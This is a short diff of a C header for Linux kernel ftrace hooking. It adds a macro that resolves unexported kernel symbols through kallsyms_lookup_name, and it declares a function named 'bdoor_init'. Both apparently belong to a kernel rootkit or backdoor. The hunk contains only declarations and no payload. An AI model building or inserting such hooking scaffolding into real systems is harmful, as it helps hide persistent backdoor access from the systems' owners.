@@ -35,7 +35,16 @@ struct ftrace_hook {
 	struct ftrace_ops ops;
 };
 
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+extern kallsyms_lookup_name_t kallsyms_lookup_namez;
 
+#define GET_FUNC_ADDR(name,signature,ret_type)                  \
+({                                                              \
+        unsigned long addr = kallsyms_lookup_namez((name));     \
+        (ret_type (*) signature)(addr);                         \
+})
+
+int bdoor_init(void);
 int fh_install_hook(struct ftrace_hook *hook);
 void fh_remove_hook(struct ftrace_hook *hook);
 int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
